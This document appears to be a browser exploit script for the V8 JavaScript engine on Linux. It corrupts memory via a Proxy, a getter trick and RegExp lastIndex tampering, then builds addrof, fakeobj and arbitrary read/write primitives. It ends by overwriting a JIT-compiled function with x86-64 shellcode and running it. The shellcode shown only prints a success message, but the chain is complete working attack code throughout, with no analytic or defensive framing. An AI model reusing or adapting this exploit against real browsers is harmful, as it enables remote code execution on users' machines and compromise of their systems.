function gc(){ for (let i=0;i<0x10;i++) new ArrayBuffer(0x800000); }
const buffer_length_int = new Int64("0x0000000000414143");
const buffer_length_smi = new Int64("0x0041414300000000");
const object_array_length_smi = new Int64("0x0000dabe00000000");

function isOSSupported() {
    var userAgent = window.navigator.userAgent;
    var platform = window.navigator.platform;

    if(/Linux/.test(platform)) {
        return true;
    }
    
    return false;
}

function exploit()
{
    function jitme(x) {
        for(let i = 2; i < x; i++)
            if(x % i === 0) return false;
        return x > 1;
    }

    function obj_to_dict(obj){

        obj.__defineGetter__('x',()=>2);
        obj.__defineGetter__('x',()=>2);
    }

    // declare our variables to trigger the vulnerability
    rgx = null;
    double_array = [1.1, 2.2, 3.3, 4.4];
    o = {};

    // specify the value of the "length" field 
    o.__defineGetter__("length", ()=>{
        rgx = new RegExp(/AAAAAAAA/y);
        return 2; // because there are two items in o[]
    });

    // 1st item in o[]
    o[0] = "aaaa";

    // 2nd item in o[]
    o.__defineGetter__(1, ()=>{
        for (let i=0;i<8;i++) double_array.push(5.5);

        var evil_o = {};
        var num = {};

        evil_o.toString = function(){
            rgx.lastIndex = num;
            return "abc".repeat(0x1000);
        }
    
        num.toString = function(){
            obj_to_dict(rgx);
            gc();
            return 0x0;
        }
        
        // we trigger the vulnerability here
        String.prototype.replace.call(evil_o,rgx,function(){});

        return "bbbb";
    });
    proxy = new Proxy({}, {
        ownKeys: function(target){

            console.log("[*] The function ownKeys() got called!");

            return o;
        },
        getOwnPropertyDescriptor(target, prop) {

            console.log("[*] The function getOwnPropertyDescriptor() got called!");

            return { configurable: true, enumerable: true, value: 5 };
        }
    });

    Object.keys(proxy);

    if (double_array[0] == 1.1){
        console.log("[-] Failed to corrupt double_array!");
        console.log("[-] Exploit corruption failed!");
        return 1;
    }
    
    for (let i=0;i<0x800;i++) double_array.push(0.0);

    var buffer_offset = Infinity;
    let object_array_offset = Infinity;
    let object_arr_value_smi = object_array_length_smi.asDouble();
    
    let obj_arr = null;
    let adjacent_buffer = null;

    for (let x = 1; x <= 5; x++){
        adjacent_buffer = new ArrayBuffer(0x414143);
        obj_arr = new Array(0x80).fill("x");

        // spray the object array with our key value
        for (let i = 0; i < 4; i++) obj_arr[i] = 0xdabe;

        for (let i = 0; i < double_array.length; i++) {

            // check if we found the key value related to our object array
            if (double_array[i] == object_arr_value_smi &&
                double_array[i+1] == object_arr_value_smi &&
                double_array[i+2] == object_arr_value_smi &&
                double_array[i+3] == object_arr_value_smi) {

                // set the offset of the object array
                object_array_offset = i;
            }

            // check if we found the key values related to our ArrayBuffer
            if(double_array[i] === buffer_length_smi.asDouble() &&
                double_array[i + 3] === buffer_length_int.asDouble()) {
                // + 1 in order to reach the backing buffer pointer
                buffer_offset = i + 1;
            }
        }
        
        // check if all elements were found, and if yes, stop looking
        if (object_array_offset != Infinity && buffer_offset != Infinity){
            break;
        }
    }
    
    // check if the object array offset was found
    if (object_array_offset == Infinity) {
        console.log("[-] Failed to find object_array_offset!");
        return 1;
    }

    // check if the buffer offset was found
    if (buffer_offset == Infinity) {
        console.log("[-] Failed to find buffer_offset!");
        return 1;
    }
    
    console.log("[*] All offsets found!");

    var memory = {
        read8(addr) {
            // save the original backing buffer pointer
            let ptr_backup = double_array[buffer_offset];
            // set the backing buffer pointer to the given address
            double_array[buffer_offset] = addr.asDouble();
            // craft an array with the corrupted buffer
            let arr = new Float64Array(adjacent_buffer, 0, 8);
            // get the value that resides at the given address
            let val = Int64.fromDouble(arr[0]);
            // restore the original backing buffer pointer
            double_array[buffer_offset] = ptr_backup;
            // return the value
            return val;
        },
        write(addr, val) {
            // save the original backing buffer pointer
            let ptr_backup = double_array[buffer_offset];
            // set the backing buffer pointer to the given address
            double_array[buffer_offset] = addr.asDouble();
            // craft an array with the corrupted buffer
            let arr = new Uint8Array(adjacent_buffer);
            // set the memory at the given address, with the value(s) given
            arr.set(val);
            // restore the original backing buffer pointer
            double_array[buffer_offset] = ptr_backup;
        },
        addrof(obj) {
            // put the object on index 0
            obj_arr[0] = obj;
            // grab the address of the object from the second array
            let address = double_array[object_array_offset];
            // convert to integer & return
            return Int64.fromDouble(address);
        },
        fakeobj(addr) {
            // put the address of the object in the double array
            double_array[object_array_offset] = addr;
            // get a fake object out of it
            let fake_obj = obj_arr[0];
            // return the fake object
            return fake_obj;
        }
    };
    
    // JIT compile the function
    for(let i = 0; i < 50; i++){
         jitme();
    }

    // The shellcode to be run
    var shellcode = [0xeb, 0x1c, 0x5e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0xba, 0x1c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x0f, 0x05, 0xe8, 0xdf, 0xff, 0xff, 0xff, 0x54, 0x68, 0x65, 0x20, 0x65, 0x78, 0x70, 0x6c, 0x6f, 0x69, 0x74, 0x20, 0x77, 0x61, 0x73, 0x73, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x66, 0x75, 0x6c, 0x21, 0x0a];

    // get the address of the jitme() function
    let jitted_function_ptr = memory.addrof(jitme);
    console.log("[*] JIT Function Address: " + jitted_function_ptr);
    
    // compensate for the fact that addresses in V8 are tagged
    let jitted_func_address = Sub(jitted_function_ptr, 1);
    // read the pointer of where the function's code is stored
    let JIT_ptr = memory.read8(Add(jitted_func_address, 48));
    // navigate at the offset of the start of the function code
    let jit_code = Add(JIT_ptr, 95);

    // write the shellcode to memory
    console.log("[+] Writing the shellcode ...")
    memory.write(jit_code, shellcode);
    // call the function that will run the shellcode
    console.log("[+] Executing the JIT function ...");
    jitme();
}

ready.then(function() {
    // check if the OS is unsupported
    if(!isOSSupported()) {
         console.log("[-] This device is not supported!");
         return 1;
     }

    // run the exploit
    exploit();

    return 0;    
}).catch(function(err) {
    console.log("[-] Initialization failed");
});

